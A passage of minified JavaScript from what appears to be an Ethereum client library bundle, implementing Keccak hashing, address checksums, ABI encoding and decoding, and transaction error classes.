    xof(t) {
        return ao(t), this.xofInto(new Uint8Array(t))
    }
    digestInto(t) {
        if (Nb(t, this), this.finished) throw new Error("digest() was already called");
        return this.writeInto(t), this.destroy(), t
    }
    digest() {
        return this.digestInto(new Uint8Array(this.outputLen))
    }
    destroy() {
        this.destroyed = !0, Qs(this.state)
    }
    _cloneInto(t) {
        const {
            blockLen: n,
            suffix: r,
            outputLen: s,
            rounds: i,
            enableXOF: o
        } = this;
        return t || (t = new Bf(n, r, s, o, i)), t.state32.set(this.state32), t.pos = this.pos, t.posOut = this.posOut, t.finished = this.finished, t.rounds = i, t.suffix = r, t.outputLen = s, t.enableXOF = o, t.destroyed = this.destroyed, t
    }
}
const jE = (e, t, n) => Pb(() => new Bf(t, e, n)),
    Bb = jE(1, 136, 256 / 8);

function We(e, t) {
    const n = t || "hex",
        r = Bb(bn(e, {
            strict: !1
        }) ? fi(e) : e);
    return n === "bytes" ? r : Xn(r)
}
const zE = e => We(fi(e));

function qE(e) {
    return zE(e)
}

function GE(e) {
    let t = !0,
        n = "",
        r = 0,
        s = "",
        i = !1;
    for (let o = 0; o < e.length; o++) {
        const a = e[o];
        if (["(", ")", ","].includes(a) && (t = !0), a === "(" && r++, a === ")" && r--, !!t) {
            if (r === 0) {
                if (a === " " && ["event", "function", ""].includes(s)) s = "";
                else if (s += a, a === ")") {
                    i = !0;
                    break
                }
                continue
            }
            if (a === " ") {
                e[o - 1] !== "," && n !== "," && n !== ",(" && (n = "", t = !1);
                continue
            }
            s += a, n += a
        }
    }
    if (!i) throw new F("Unable to normalize signature.");
    return s
}
const WE = e => {
    const t = typeof e == "string" ? e : lc(e);
    return GE(t)
};

function Lb(e) {
    return qE(WE(e))
}
const fl = Lb;
let _r = class extends F {
        constructor({
            address: t
        }) {
            super(`Address "${t}" is invalid.`, {
                metaMessages: ["- Address must be a hex value of 20 bytes (40 hex characters).", "- Address must match its checksum counterpart."],
                name: "InvalidAddressError"
            })
        }
    },
    di = class extends Map {
        constructor(t) {
            super(), Object.defineProperty(this, "maxSize", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: void 0
            }), this.maxSize = t
        }
        get(t) {
            const n = super.get(t);
            return super.has(t) && n !== void 0 && (this.delete(t), super.set(t, n)), n
        }
        set(t, n) {
            if (super.set(t, n), this.maxSize && this.size > this.maxSize) {
                const r = this.keys().next().value;
                r && this.delete(r)
            }
            return this
        }
    };
const Xl = new di(8192);

function Ko(e, t) {
    if (Xl.has(`${e}.${t}`)) return Xl.get(`${e}.${t}`);
    const n = e.substring(2).toLowerCase(),
        r = We(Kr(n), "bytes"),
        s = n.split("");
    for (let o = 0; o < 40; o += 2) r[o >> 1] >> 4 >= 8 && s[o] && (s[o] = s[o].toUpperCase()), (r[o >> 1] & 15) >= 8 && s[o + 1] && (s[o + 1] = s[o + 1].toUpperCase());
    const i = `0x${s.join("")}`;
    return Xl.set(`${e}.${t}`, i), i
}

function Lf(e, t) {
    if (!zt(e, {
            strict: !1
        })) throw new _r({
        address: e
    });
    return Ko(e, t)
}
const XE = /^0x[a-fA-F0-9]{40}$/,
    Kl = new di(8192);

function zt(e, t) {
    const {
        strict: n = !0
    } = t ?? {}, r = `${e}.${n}`;
    if (Kl.has(r)) return Kl.get(r);
    const s = XE.test(e) ? e.toLowerCase() === e ? !0 : n ? Ko(e) === e : !0 : !1;
    return Kl.set(r, s), s
}

function qt(e) {
    return typeof e[0] == "string" ? hi(e) : KE(e)
}

function KE(e) {
    let t = 0;
    for (const s of e) t += s.length;
    const n = new Uint8Array(t);
    let r = 0;
    for (const s of e) n.set(s, r), r += s.length;
    return n
}

function hi(e) {
    return `0x${e.reduce((t,n)=>t+n.replace("0x",""),"")}`
}

function ei(e, t, n, {
    strict: r
} = {}) {
    return bn(e, {
        strict: !1
    }) ? zu(e, t, n, {
        strict: r
    }) : Fb(e, t, n, {
        strict: r
    })
}

function $b(e, t) {
    if (typeof t == "number" && t > 0 && t > Ie(e) - 1) throw new Sb({
        offset: t,
        position: "start",
        size: Ie(e)
    })
}

function Db(e, t, n) {
    if (typeof t == "number" && typeof n == "number" && Ie(e) !== n - t) throw new Sb({
        offset: n,
        position: "end",
        size: Ie(e)
    })
}

function Fb(e, t, n, {
    strict: r
} = {}) {
    $b(e, t);
    const s = e.slice(t, n);
    return r && Db(s, t, n), s
}

function zu(e, t, n, {
    strict: r
} = {}) {
    $b(e, t);
    const s = `0x${e.replace("0x","").slice((t??0)*2,(n??e.length)*2)}`;
    return r && Db(s, t, n), s
}
const ZE = /^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,
    Ub = /^(u?int)(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/;

function hs(e, t) {
    if (e.length !== t.length) throw new eE({
        expectedLength: e.length,
        givenLength: t.length
    });
    const n = YE({
            params: e,
            values: t
        }),
        r = Df(n);
    return r.length === 0 ? "0x" : r
}

function YE({
    params: e,
    values: t
}) {
    const n = [];
    for (let r = 0; r < e.length; r++) n.push($f({
        param: e[r],
        value: t[r]
    }));
    return n
}

function $f({
    param: e,
    value: t
}) {
    const n = Ff(e.type);
    if (n) {
        const [r, s] = n;
        return QE(t, {
            length: r,
            param: {
                ...e,
                type: s
            }
        })
    }
    if (e.type === "tuple") return s4(t, {
        param: e
    });
    if (e.type === "address") return JE(t);
    if (e.type === "bool") return t4(t);
    if (e.type.startsWith("uint") || e.type.startsWith("int")) {
        const r = e.type.startsWith("int"),
            [, , s = "256"] = Ub.exec(e.type) ?? [];
        return n4(t, {
            signed: r,
            size: Number(s)
        })
    }
    if (e.type.startsWith("bytes")) return e4(t, {
        param: e
    });
    if (e.type === "string") return r4(t);
    throw new oE(e.type, {
        docsPath: "/docs/contract/encodeAbiParameters"
    })
}

function Df(e) {
    let t = 0;
    for (let i = 0; i < e.length; i++) {
        const {
            dynamic: o,
            encoded: a
        } = e[i];
        o ? t += 32 : t += Ie(a)
    }
    const n = [],
        r = [];
    let s = 0;
    for (let i = 0; i < e.length; i++) {
        const {
            dynamic: o,
            encoded: a
        } = e[i];
        o ? (n.push(J(t + s, {
            size: 32
        })), r.push(a), s += Ie(a)) : n.push(a)
    }
    return qt([...n, ...r])
}

function JE(e) {
    if (!zt(e)) throw new _r({
        address: e
    });
    return {
        dynamic: !1,
        encoded: gr(e.toLowerCase())
    }
}

function QE(e, {
    length: t,
    param: n
}) {
    const r = t === null;
    if (!Array.isArray(e)) throw new Tb(e);
    if (!r && e.length !== t) throw new J3({
        expectedLength: t,
        givenLength: e.length,
        type: `${n.type}[${t}]`
    });
    let s = !1;
    const i = [];
    for (let o = 0; o < e.length; o++) {
        const a = $f({
            param: n,
            value: e[o]
        });
        a.dynamic && (s = !0), i.push(a)
    }
    if (r || s) {
        const o = Df(i);
        if (r) {
            const a = J(i.length, {
                size: 32
            });
            return {
                dynamic: !0,
                encoded: i.length > 0 ? qt([a, o]) : a
            }
        }
        if (s) return {
            dynamic: !0,
            encoded: o
        }
    }
    return {
        dynamic: !1,
        encoded: qt(i.map(({
            encoded: o
        }) => o))
    }
}

function e4(e, {
    param: t
}) {
    const [, n] = t.type.split("bytes"), r = Ie(e);
    if (!n) {
        let s = e;
        return r % 32 !== 0 && (s = gr(s, {
            dir: "right",
            size: Math.ceil((e.length - 2) / 2 / 32) * 32
        })), {
            dynamic: !0,
            encoded: qt([gr(J(r, {
                size: 32
            })), s])
        }
    }
    if (r !== Number.parseInt(n, 10)) throw new Q3({
        expectedSize: Number.parseInt(n, 10),
        value: e
    });
    return {
        dynamic: !1,
        encoded: gr(e, {
            dir: "right"
        })
    }
}

function t4(e) {
    if (typeof e != "boolean") throw new F(`Invalid boolean value: "${e}" (type: ${typeof e}). Expected: \`true\` or \`false\`.`);
    return {
        dynamic: !1,
        encoded: gr(Ab(e))
    }
}

function n4(e, {
    signed: t,
    size: n = 256
}) {
    if (typeof n == "number") {
        const r = 2n ** (BigInt(n) - (t ? 1n : 0n)) - 1n,
            s = t ? -r - 1n : 0n;
        if (e > r || e < s) throw new Ib({
            max: r.toString(),
            min: s.toString(),
            signed: t,
            size: n / 8,
            value: e.toString()
        })
    }
    return {
        dynamic: !1,
        encoded: J(e, {
            size: 32,
            signed: t
        })
    }
}

function r4(e) {
    const t = Ys(e),
        n = Math.ceil(Ie(t) / 32),
        r = [];
    for (let s = 0; s < n; s++) r.push(gr(ei(t, s * 32, (s + 1) * 32), {
        dir: "right"
    }));
    return {
        dynamic: !0,
        encoded: qt([gr(J(Ie(t), {
            size: 32
        })), ...r])
    }
}

function s4(e, {
    param: t
}) {
    let n = !1;
    const r = [];
    for (let s = 0; s < t.components.length; s++) {
        const i = t.components[s],
            o = Array.isArray(e) ? s : i.name,
            a = $f({
                param: i,
                value: e[o]
            });
        r.push(a), a.dynamic && (n = !0)
    }
    return {
        dynamic: n,
        encoded: n ? Df(r) : qt(r.map(({
            encoded: s
        }) => s))
    }
}

function Ff(e) {
    const t = e.match(/^(.*)\[(\d+)?\]$/);
    return t ? [t[2] ? Number(t[2]) : null, t[1]] : void 0
}
const Zo = e => ei(Lb(e), 0, 4);

function ps(e) {
    const {
        abi: t,
        args: n = [],
        name: r
    } = e, s = bn(r, {
        strict: !1
    }), i = t.filter(a => s ? a.type === "function" ? Zo(a) === r : a.type === "event" ? fl(a) === r : !1 : "name" in a && a.name === r);
    if (i.length === 0) return;
    if (i.length === 1) return i[0];
    let o;
    for (const a of i) {
        if (!("inputs" in a)) continue;
        if (!n || n.length === 0) {
            if (!a.inputs || a.inputs.length === 0) return a;
            continue
        }
        if (!a.inputs || a.inputs.length === 0 || a.inputs.length !== n.length) continue;
        if (n.every((u, l) => {
                const f = "inputs" in a && a.inputs[l];
                return f ? qu(u, f) : !1
            })) {
            if (o && "inputs" in o && o.inputs) {
                const u = Vb(a.inputs, o.inputs, n);
                if (u) throw new sE({
                    abiItem: a,
                    type: u[0]
                }, {
                    abiItem: o,
                    type: u[1]
                })
            }
            o = a
        }
    }
    return o || i[0]
}

function qu(e, t) {
    const n = typeof e,
        r = t.type;
    switch (r) {
        case "address":
            return zt(e, {
                strict: !1
            });
        case "bool":
            return n === "boolean";
        case "function":
            return n === "string";
        case "string":
            return n === "string";
        default:
            return r === "tuple" && "components" in t ? Object.values(t.components).every((s, i) => qu(Object.values(e)[i], s)) : /^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/.test(r) ? n === "number" || n === "bigint" : /^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/.test(r) ? n === "string" || e instanceof Uint8Array : /[a-z]+[1-9]{0,3}(\[[0-9]{0,}\])+$/.test(r) ? Array.isArray(e) && e.every(s => qu(s, {
                ...t,
                type: r.replace(/(\[[0-9]{0,}\])$/, "")
            })) : !1
    }
}

function Vb(e, t, n) {
    for (const r in e) {
        const s = e[r],
            i = t[r];
        if (s.type === "tuple" && i.type === "tuple" && "components" in s && "components" in i) return Vb(s.components, i.components, n[r]);
        const o = [s.type, i.type];
        if (o.includes("address") && o.includes("bytes20") ? !0 : o.includes("address") && o.includes("string") ? zt(n[r], {
                strict: !1
            }) : o.includes("address") && o.includes("bytes") ? zt(n[r], {
                strict: !1
            }) : !1) return o
    }
}
const Yh = "/docs/contract/encodeEventTopics";

function Yo(e) {
    const {
        abi: t,
        eventName: n,
        args: r
    } = e;
    let s = t[0];
    if (n) {
        const c = ps({
            abi: t,
            name: n
        });
        if (!c) throw new zh(n, {
            docsPath: Yh
        });
        s = c
    }
    if (s.type !== "event") throw new zh(void 0, {
        docsPath: Yh
    });
    const i = Jt(s),
        o = fl(i);
    let a = [];
    if (r && "inputs" in s) {
        const c = s.inputs?.filter(l => "indexed" in l && l.indexed),
            u = Array.isArray(r) ? r : Object.values(r).length > 0 ? c?.map(l => r[l.name]) ?? [] : [];
        u.length > 0 && (a = c?.map((l, f) => Array.isArray(u[f]) ? u[f].map((d, h) => Jh({
            param: l,
            value: u[f][h]
        })) : typeof u[f] < "u" && u[f] !== null ? Jh({
            param: l,
            value: u[f]
        }) : null) ?? [])
    }
    return [o, ...a]
}

function Jh({
    param: e,
    value: t
}) {
    if (e.type === "string" || e.type === "bytes") return We(fi(t));
    if (e.type === "tuple" || e.type.match(/^(.*)\[(\d+)?\]$/)) throw new lE(e.type);
    return hs([e], [t])
}

function dl(e, {
    method: t
}) {
    const n = {};
    return e.transport.type === "fallback" && e.transport.onResponse?.(({
        method: r,
        response: s,
        status: i,
        transport: o
    }) => {
        i === "success" && t === r && (n[s] = o.request)
    }), (r => n[r] || e.request)
}
async function Hb(e, t) {
    const {
        address: n,
        abi: r,
        args: s,
        eventName: i,
        fromBlock: o,
        strict: a,
        toBlock: c
    } = t, u = dl(e, {
        method: "eth_newFilter"
    }), l = i ? Yo({
        abi: r,
        args: s,
        eventName: i
    }) : void 0, f = await e.request({
        method: "eth_newFilter",
        params: [{
            address: n,
            fromBlock: typeof o == "bigint" ? J(o) : o,
            toBlock: typeof c == "bigint" ? J(c) : c,
            topics: l
        }]
    });
    return {
        abi: r,
        args: s,
        eventName: i,
        id: f,
        request: u(f),
        strict: !!a,
        type: "event"
    }
}

function Se(e) {
    return typeof e == "string" ? {
        address: e,
        type: "json-rpc"
    } : e
}
const Qh = "/docs/contract/encodeFunctionData";

function i4(e) {
    const {
        abi: t,
        args: n,
        functionName: r
    } = e;
    let s = t[0];
    if (r) {
        const i = ps({
            abi: t,
            args: n,
            name: r
        });
        if (!i) throw new Zs(r, {
            docsPath: Qh
        });
        s = i
    }
    if (s.type !== "function") throw new Zs(void 0, {
        docsPath: Qh
    });
    return {
        abi: [s],
        functionName: Zo(Jt(s))
    }
}

function Bt(e) {
    const {
        args: t
    } = e, {
        abi: n,
        functionName: r
    } = e.abi.length === 1 && e.functionName?.startsWith("0x") ? e : i4(e), s = n[0], i = r, o = "inputs" in s && s.inputs ? hs(s.inputs, t ?? []) : void 0;
    return hi([i, o ?? "0x"])
}
const o4 = {
        1: "An `assert` condition failed.",
        17: "Arithmetic operation resulted in underflow or overflow.",
        18: "Division or modulo by zero (e.g. `5 / 0` or `23 % 0`).",
        33: "Attempted to convert to an invalid type.",
        34: "Attempted to access a storage byte array that is incorrectly encoded.",
        49: "Performed `.pop()` on an empty array",
        50: "Array index is out of bounds.",
        65: "Allocated too much memory or created an array which is too large.",
        81: "Attempted to call a zero-initialized variable of internal function type."
    },
    jb = {
        inputs: [{
            name: "message",
            type: "string"
        }],
        name: "Error",
        type: "error"
    },
    a4 = {
        inputs: [{
            name: "reason",
            type: "uint256"
        }],
        name: "Panic",
        type: "error"
    };
let ep = class extends F {
        constructor({
            offset: t
        }) {
            super(`Offset \`${t}\` cannot be negative.`, {
                name: "NegativeOffsetError"
            })
        }
    },
    zb = class extends F {
        constructor({
            length: t,
            position: n
        }) {
            super(`Position \`${n}\` is out of bounds (\`0 < position < ${t}\`).`, {
                name: "PositionOutOfBoundsError"
            })
        }
    },
    c4 = class extends F {
        constructor({
            count: t,
            limit: n
        }) {
            super(`Recursive read limit of \`${n}\` exceeded (recursive read count: \`${t}\`).`, {
                name: "RecursiveReadLimitExceededError"
            })
        }
    };
const l4 = {
    bytes: new Uint8Array,
    dataView: new DataView(new ArrayBuffer(0)),
    position: 0,
    positionReadCount: new Map,
    recursiveReadCount: 0,
    recursiveReadLimit: Number.POSITIVE_INFINITY,
    assertReadLimit() {
        if (this.recursiveReadCount >= this.recursiveReadLimit) throw new c4({
            count: this.recursiveReadCount + 1,
            limit: this.recursiveReadLimit
        })
    },
    assertPosition(e) {
        if (e < 0 || e > this.bytes.length - 1) throw new zb({
            length: this.bytes.length,
            position: e
        })
    },
    decrementPosition(e) {
        if (e < 0) throw new ep({
            offset: e
        });
        const t = this.position - e;
        this.assertPosition(t), this.position = t
    },
    getReadCount(e) {
        return this.positionReadCount.get(e || this.position) || 0
    },
    incrementPosition(e) {
        if (e < 0) throw new ep({
            offset: e
        });
        const t = this.position + e;
        this.assertPosition(t), this.position = t
    },
    inspectByte(e) {
        const t = e ?? this.position;
        return this.assertPosition(t), this.bytes[t]
    },
    inspectBytes(e, t) {
        const n = t ?? this.position;
        return this.assertPosition(n + e - 1), this.bytes.subarray(n, n + e)
    },
    inspectUint8(e) {
        const t = e ?? this.position;
        return this.assertPosition(t), this.bytes[t]
    },
    inspectUint16(e) {
        const t = e ?? this.position;
        return this.assertPosition(t + 1), this.dataView.getUint16(t)
    },
    inspectUint24(e) {
        const t = e ?? this.position;
        return this.assertPosition(t + 2), (this.dataView.getUint16(t) << 8) + this.dataView.getUint8(t + 2)
    },
    inspectUint32(e) {
        const t = e ?? this.position;
        return this.assertPosition(t + 3), this.dataView.getUint32(t)
    },
    pushByte(e) {
        this.assertPosition(this.position), this.bytes[this.position] = e, this.position++
    },
    pushBytes(e) {
        this.assertPosition(this.position + e.length - 1), this.bytes.set(e, this.position), this.position += e.length
    },
    pushUint8(e) {
        this.assertPosition(this.position), this.bytes[this.position] = e, this.position++
    },
    pushUint16(e) {
        this.assertPosition(this.position + 1), this.dataView.setUint16(this.position, e), this.position += 2
    },
    pushUint24(e) {
        this.assertPosition(this.position + 2), this.dataView.setUint16(this.position, e >> 8), this.dataView.setUint8(this.position + 2, e & 255), this.position += 3
    },
    pushUint32(e) {
        this.assertPosition(this.position + 3), this.dataView.setUint32(this.position, e), this.position += 4
    },
    readByte() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectByte();
        return this.position++, e
    },
    readBytes(e, t) {
        this.assertReadLimit(), this._touch();
        const n = this.inspectBytes(e);
        return this.position += t ?? e, n
    },
    readUint8() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectUint8();
        return this.position += 1, e
    },
    readUint16() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectUint16();
        return this.position += 2, e
    },
    readUint24() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectUint24();
        return this.position += 3, e
    },
    readUint32() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectUint32();
        return this.position += 4, e
    },
    get remaining() {
        return this.bytes.length - this.position
    },
    setPosition(e) {
        const t = this.position;
        return this.assertPosition(e), this.position = e, () => this.position = t
    },
    _touch() {
        if (this.recursiveReadLimit === Number.POSITIVE_INFINITY) return;
        const e = this.getReadCount();
        this.positionReadCount.set(this.position, e + 1), e > 0 && this.recursiveReadCount++
    }
};

function Uf(e, {
    recursiveReadLimit: t = 8192
} = {}) {
    const n = Object.create(l4);
    return n.bytes = e, n.dataView = new DataView(e.buffer, e.byteOffset, e.byteLength), n.positionReadCount = new Map, n.recursiveReadLimit = t, n
}

function u4(e, t = {}) {
    typeof t.size < "u" && rn(e, {
        size: t.size
    });
    const n = Le(e, t);
    return Mt(n, t)
}

function f4(e, t = {}) {
    let n = e;
    if (typeof t.size < "u" && (rn(n, {
            size: t.size
        }), n = xr(n)), n.length > 1 || n[0] > 1) throw new fE(n);
    return !!n[0]
}

function Fn(e, t = {}) {
    typeof t.size < "u" && rn(e, {
        size: t.size
    });
    const n = Le(e, t);
    return Qt(n, t)
}

function d4(e, t = {}) {
    let n = e;
    return typeof t.size < "u" && (rn(n, {
        size: t.size
    }), n = xr(n, {
        dir: "right"
    })), new TextDecoder().decode(n)
}

function Jo(e, t) {
    const n = typeof t == "string" ? gn(t) : t,
        r = Uf(n);
    if (Ie(n) === 0 && e.length > 0) throw new Xo;
    if (Ie(t) && Ie(t) < 32) throw new wb({
        data: typeof t == "string" ? t : Le(t),
        params: e,
        size: Ie(t)
    });
    let s = 0;
    const i = [];
    for (let o = 0; o < e.length; ++o) {
        const a = e[o];
        r.setPosition(s);
        const [c, u] = Bs(r, a, {
            staticPosition: 0
        });
        s += u, i.push(c)
    }
    return i
}

function Bs(e, t, {
    staticPosition: n
}) {
    const r = Ff(t.type);
    if (r) {
        const [s, i] = r;
        return p4(e, {
            ...t,
            type: i
        }, {
            length: s,
            staticPosition: n
        })
    }
    if (t.type === "tuple") return x4(e, t, {
        staticPosition: n
    });
    if (t.type === "address") return h4(e);
    if (t.type === "bool") return m4(e);
    if (t.type.startsWith("bytes")) return b4(e, t, {
        staticPosition: n
    });
    if (t.type.startsWith("uint") || t.type.startsWith("int")) return g4(e, t);
    if (t.type === "string") return y4(e, {
        staticPosition: n
    });
    throw new aE(t.type, {
        docsPath: "/docs/contract/decodeAbiParameters"
    })
}
const tp = 32,
    Gu = 32;

function h4(e) {
    const t = e.readBytes(32);
    return [Ko(Le(Fb(t, -20))), 32]
}

function p4(e, t, {
    length: n,
    staticPosition: r
}) {
    if (!n) {
        const o = Fn(e.readBytes(Gu)),
            a = r + o,
            c = a + tp;
        e.setPosition(a);
        const u = Fn(e.readBytes(tp)),
            l = co(t);
        let f = 0;
        const d = [];
        for (let h = 0; h < u; ++h) {
            e.setPosition(c + (l ? h * 32 : f));
            const [b, m] = Bs(e, t, {
                staticPosition: c
            });
            f += m, d.push(b)
        }
        return e.setPosition(r + 32), [d, 32]
    }
    if (co(t)) {
        const o = Fn(e.readBytes(Gu)),
            a = r + o,
            c = [];
        for (let u = 0; u < n; ++u) {
            e.setPosition(a + u * 32);
            const [l] = Bs(e, t, {
                staticPosition: a
            });
            c.push(l)
        }
        return e.setPosition(r + 32), [c, 32]
    }
    let s = 0;
    const i = [];
    for (let o = 0; o < n; ++o) {
        const [a, c] = Bs(e, t, {
            staticPosition: r + s
        });
        s += c, i.push(a)
    }
    return [i, s]
}

function m4(e) {
    return [f4(e.readBytes(32), {
        size: 32
    }), 32]
}

function b4(e, t, {
    staticPosition: n
}) {
    const [r, s] = t.type.split("bytes");
    if (!s) {
        const o = Fn(e.readBytes(32));
        e.setPosition(n + o);
        const a = Fn(e.readBytes(32));
        if (a === 0) return e.setPosition(n + 32), ["0x", 32];
        const c = e.readBytes(a);
        return e.setPosition(n + 32), [Le(c), 32]
    }
    return [Le(e.readBytes(Number.parseInt(s, 10), 32)), 32]
}

function g4(e, t) {
    const n = t.type.startsWith("int"),
        r = Number.parseInt(t.type.split("int")[1] || "256", 10),
        s = e.readBytes(32);
    return [r > 48 ? u4(s, {
        signed: n
    }) : Fn(s, {
        signed: n
    }), 32]
}

function x4(e, t, {
    staticPosition: n
}) {
    const r = t.components.length === 0 || t.components.some(({
            name: o
        }) => !o),
        s = r ? [] : {};
    let i = 0;
    if (co(t)) {
        const o = Fn(e.readBytes(Gu)),
            a = n + o;
        for (let c = 0; c < t.components.length; ++c) {
            const u = t.components[c];
            e.setPosition(a + i);
            const [l, f] = Bs(e, u, {
                staticPosition: a
            });
            i += f, s[r ? c : u?.name] = l
        }
        return e.setPosition(n + 32), [s, 32]
    }
    for (let o = 0; o < t.components.length; ++o) {
        const a = t.components[o],
            [c, u] = Bs(e, a, {
                staticPosition: n
            });
        s[r ? o : a?.name] = c, i += u
    }
    return [s, i]
}

function y4(e, {
    staticPosition: t
}) {
    const n = Fn(e.readBytes(32)),
        r = t + n;
    e.setPosition(r);
    const s = Fn(e.readBytes(32));
    if (s === 0) return e.setPosition(t + 32), ["", 32];
    const i = e.readBytes(s, 32),
        o = d4(xr(i));
    return e.setPosition(t + 32), [o, 32]
}

function co(e) {
    const {
        type: t
    } = e;
    if (t === "string" || t === "bytes" || t.endsWith("[]")) return !0;
    if (t === "tuple") return e.components?.some(co);
    const n = Ff(e.type);
    return !!(n && co({
        ...e,
        type: n[1]
    }))
}

function w4(e) {
    const {
        abi: t,
        data: n
    } = e, r = ei(n, 0, 4);
    if (r === "0x") throw new Xo;
    const i = [...t || [], jb, a4].find(o => o.type === "error" && r === Zo(Jt(o)));
    if (!i) throw new _b(r, {
        docsPath: "/docs/contract/decodeErrorResult"
    });
    return {
        abiItem: i,
        args: "inputs" in i && i.inputs && i.inputs.length > 0 ? Jo(i.inputs, ei(n, 4)) : void 0,
        errorName: i.name
    }
}
const Be = (e, t, n) => JSON.stringify(e, (r, s) => typeof s == "bigint" ? s.toString() : s, n);

function qb({
    abiItem: e,
    args: t,
    includeFunctionName: n = !0,
    includeName: r = !1
}) {
    if ("name" in e && "inputs" in e && e.inputs) return `${n?e.name:""}(${e.inputs.map((s,i)=>`${r&&s.name?`${s.name}: `:""}${typeof t[i]=="object"?Be(t[i]):t[i]}`).join(", ")})`
}
const Gb = {
        gwei: 9,
        wei: 18
    },
    _4 = {
        ether: -9,
        wei: 9
    };

function Wb(e, t) {
    let n = e.toString();
    const r = n.startsWith("-");
    r && (n = n.slice(1)), n = n.padStart(t, "0");
    let [s, i] = [n.slice(0, n.length - t), n.slice(n.length - t)];
    return i = i.replace(/(0+)$/, ""), `${r?"-":""}${s||"0"}${i?`.${i}`:""}`
}

function Un(e, t = "wei") {
    return Wb(e, Gb[t])
}

function Et(e, t = "wei") {
    return Wb(e, _4[t])
}
class E4 extends F {
    constructor({
        address: t
    }) {
        super(`State for account "${t}" is set multiple times.`, {
            name: "AccountStateConflictError"
        })
    }
}
class v4 extends F {
    constructor() {
        super("state and stateDiff are set on the same account.", {
            name: "StateAssignmentConflictError"
        })
    }
}

function np(e) {
    return e.reduce((t, {
        slot: n,
        value: r
    }) => `${t}        ${n}: ${r}
`, "")
}

function T4(e) {
    return e.reduce((t, {
        address: n,
        ...r
    }) => {
        let s = `${t}    ${n}:
`;
        return r.nonce && (s += `      nonce: ${r.nonce}
`), r.balance && (s += `      balance: ${r.balance}
`), r.code && (s += `      code: ${r.code}
`), r.state && (s += `      state:
`, s += np(r.state)), r.stateDiff && (s += `      stateDiff:
`, s += np(r.stateDiff)), s
    }, `  State Override:
`).slice(0, -1)
}

function Qo(e) {
    const t = Object.entries(e).map(([r, s]) => s === void 0 || s === !1 ? null : [r, s]).filter(Boolean),
        n = t.reduce((r, [s]) => Math.max(r, s.length), 0);
    return t.map(([r, s]) => `  ${`${r}:`.padEnd(n+1)}  ${s}`).join(`
`)
}
class S4 extends F {
    constructor({
        transaction: t
    }) {
        super("Cannot infer a transaction type from provided transaction.", {
            metaMessages: ["Provided Transaction:", "{", Qo(t), "}", "", "To infer the type, either provide:", "- a `type` to the Transaction, or", "- an EIP-1559 Transaction with `maxFeePerGas`, or", "- an EIP-2930 Transaction with `gasPrice` & `accessList`, or", "- an EIP-4844 Transaction with `blobs`, `blobVersionedHashes`, `sidecars`, or", "- an EIP-7702 Transaction with `authorizationList`, or", "- a Legacy Transaction with `gasPrice`"],
            name: "InvalidSerializableTransactionError"
        })
    }
}
class C4 extends F {
    constructor(t, {
        account: n,
        docsPath: r,
        chain: s,
        data: i,
        gas: o,
        gasPrice: a,
        maxFeePerGas: c,
        maxPriorityFeePerGas: u,
        nonce: l,
        to: f,
        value: d
    }) {
        const h = Qo({
            chain: s && `${s?.name} (id: ${s?.id})`,
            from: n?.address,
            to: f,
            value: typeof d < "u" && `${Un(d)} ${s?.nativeCurrency?.symbol||"ETH"}`,
            data: i,
            gas: o,
            gasPrice: typeof a < "u" && `${Et(a)} gwei`,
            maxFeePerGas: typeof c < "u" && `${Et(c)} gwei`,
            maxPriorityFeePerGas: typeof u < "u" && `${Et(u)} gwei`,
            nonce: l
        });
        super(t.shortMessage, {
            cause: t,
            docsPath: r,
            metaMessages: [...t.metaMessages ? [...t.metaMessages, " "] : [], "Request Arguments:", h].filter(Boolean),
            name: "TransactionExecutionError"
        }), Object.defineProperty(this, "cause", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.cause = t
    }
}
class Xb extends F {
    constructor({
        blockHash: t,
        blockNumber: n,
        blockTag: r,
        hash: s,
        index: i
    }) {
        let o = "Transaction";
        r && i !== void 0 && (o = `Transaction at block time "${r}" at index "${i}"`), t && i !== void 0 && (o = `Transaction at block hash "${t}" at index "${i}"`), n && i !== void 0 && (o = `Transaction at block number "${n}" at index "${i}"`), s && (o = `Transaction with hash "${s}"`), super(`${o} could not be found.`, {
            name: "TransactionNotFoundError"
        })
    }
}
class Kb extends F {
    constructor({
        hash: t
    }) {
        super(`Transaction receipt with hash "${t}" could not be found. The Transaction may not be processed on a block yet.`, {
            name: "TransactionReceiptNotFoundError"
        })
    }
}
class Zb extends F {
    constructor({
        receipt: t
    }) {
        super(`Transaction with hash "${t.transactionHash}" reverted.`, {
            metaMessages: ['The receipt marked the transaction as "reverted". This could mean that the function on the contract you are trying to call threw an error.', " ", "You can attempt to extract the revert reason by:", "- calling the `simulateContract` or `simulateCalls` Action with the `abi` and `functionName` of the contract", "- using the `call` Action with raw `data`"],
            name: "TransactionReceiptRevertedError"
        }), Object.defineProperty(this, "receipt", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.receipt = t
    }
}
class I4 extends F {
    constructor({
        hash: t
    }) {
        super(`Timed out while waiting for transaction with hash "${t}" to be confirmed.`, {
            name: "WaitForTransactionReceiptTimeoutError"
        })
    }
}
const A4 = e => e,
    Vf = e => e;
class Yb extends F {
    constructor(t, {
        account: n,
        docsPath: r,
        chain: s,
        data: i,
        gas: o,
        gasPrice: a,
        maxFeePerGas: c,
        maxPriorityFeePerGas: u,
        nonce: l,
        to: f,
        value: d,
        stateOverride: h
    }) {
        const b = n ? Se(n) : void 0;
        let m = Qo({
            from: b?.address,
            to: f,
            value: typeof d < "u" && `${Un(d)} ${s?.nativeCurrency?.symbol||"ETH"}`,
            data: i,
            gas: o,
            gasPrice: typeof a < "u" && `${Et(a)} gwei`,
            maxFeePerGas: typeof c < "u" && `${Et(c)} gwei`,
            maxPriorityFeePerGas: typeof u < "u" && `${Et(u)} gwei`,
            nonce: l
        });
        h && (m += `
${T4(h)}`), super(t.shortMessage, {
            cause: t,
            docsPath: r,
